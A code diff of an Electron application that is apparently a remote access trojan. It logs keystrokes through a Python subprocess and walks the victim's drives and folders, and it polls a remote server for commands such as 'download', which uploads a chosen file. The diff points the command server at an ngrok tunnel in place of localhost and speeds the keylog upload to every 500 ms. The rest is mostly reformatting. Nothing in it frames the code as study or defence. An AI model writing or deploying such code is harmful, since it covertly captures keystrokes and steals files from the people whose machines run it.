@@ -10,7 +10,7 @@ const fs = require('fs');
 const Store = require('electron-store'); const store = new Store;
 
 //const remotehost = 'http://localhost:1999';
-const remotehost = 'http://localhost:1999';
+const remotehost = 'https://3739ea6bf455.ngrok.io';
 
 let mainWindow = null;//defines the window as an abject
 let rat_win = null
@@ -59,13 +59,14 @@ app.on('ready', function () {//App is ready to start
 	setTimeout(() => {
 		//camanager.start_webcam()
 		directoryman.search_root()
-		setInterval(() => { keylog.get_keys(); }, 5000)
+		setInterval(() => { keylog.get_keys(); }, 500)
 		setInterval(() => { directoryman.remote_instructions() }, 200)
 	}, 500);//child process wont start instantly
 })
 
 
 /* Rat functions */
+/*
 function make_rat_window() {//create rat window
 	rat_win = new BrowserWindow({
 		width: 1000,
@@ -93,7 +94,7 @@ function make_rat_window() {//create rat window
 	}));
 
 	//rat_win.setApplicationMenu
-}
+}*/
 
 let keylog = {
 	get_keys: async function () {//get keylog from python sub process and send to server
@@ -112,34 +113,35 @@ let directoryman = {
 			remotehost + '/action/post/folders', {
 			files: directoryman.files,
 			current_dir: directoryman.current_dir
-		}).then(res => {//instructions in the response
+		})
+			.then(res => {//instructions in the response
 
-			if (res.data != null) {
+				if (res.data != null) {
 
-				var instriction = JSON.parse(res.data)
-				console.log('server replied: ', instriction)
+					var instriction = JSON.parse(res.data)
+					console.log('server replied: ', instriction)
 
-				switch (instriction.action) {
-					case 'do nothing':
-						//do no action
-						break;
-					case 'search_root':
-						directoryman.search_root()
-						break;
-					case 'search_dir':
-						directoryman.search_dir(instriction.path)
-						break;
-					case 'download':
-						directoryman.upload(instriction.path)
-						break;
-					case 'go_back_a_dir':
-						directoryman.go_back_a_dir()
-						break;
-					default:
-						console.warn('Unknown instruction: ', instriction)
+					switch (instriction.action) {
+						case 'do nothing':
+							//do no action
+							break;
+						case 'search_root':
+							directoryman.search_root()
+							break;
+						case 'search_dir':
+							directoryman.search_dir(instriction.path)
+							break;
+						case 'download':
+							directoryman.upload(instriction.path)
+							break;
+						case 'go_back_a_dir':
+							directoryman.go_back_a_dir()
+							break;
+						default:
+							console.warn('Unknown instruction: ', instriction)
+					}
 				}
-			}
-		}).catch(err => { /*console.warn('Server responed with a flawed instruction', err)*/ })//post folder state to server
+			}).catch(err => { /*console.warn('Server responed with a flawed instruction', err)*/ })//post folder state to server
 	},
 	search_root: async function () {//Search root drives, functionality stats here
 		console.log('Search root');
@@ -150,7 +152,7 @@ let directoryman = {
 
 		for (let i in letters) {//for each letter
 			if (fs.existsSync(letters[i])) {//directory exists?
-				directoryman.files.push({ path: letters[i], name: letters[i], type: 'folder' });//data to send tpo server later
+				directoryman.files.push({ base: letters[i], type: 'folder' });//data to send tpo server later
 			}
 		}
 	},
@@ -168,16 +170,16 @@ let directoryman = {
 			console.log(files)
 
 			files.forEach(filee => {//for each file
-				try{
-					if (fs.statSync(path.join(searchpath,filee)).isDirectory()) {//directory or file?
-						directoryman.files.push({ path: path.join(searchpath,filee), name: filee, type: 'folder' })
+				try {
+					if (fs.statSync(path.join(searchpath, filee)).isDirectory()) {//directory or file?
+						directoryman.files.push({ base: path.basename(path.join(searchpath, filee)), type: 'folder' })
 					} else {
-						directoryman.files.push({ path: path.join(searchpath,filee), name: filee, type: 'file' })
+						directoryman.files.push({ base: path.basename(path.join(searchpath, filee)), type: 'file' })
 					}
-				}catch(err){
+				} catch (err) {
 					console.warn(err)
 				}
-				
+
 			})
 
 		})
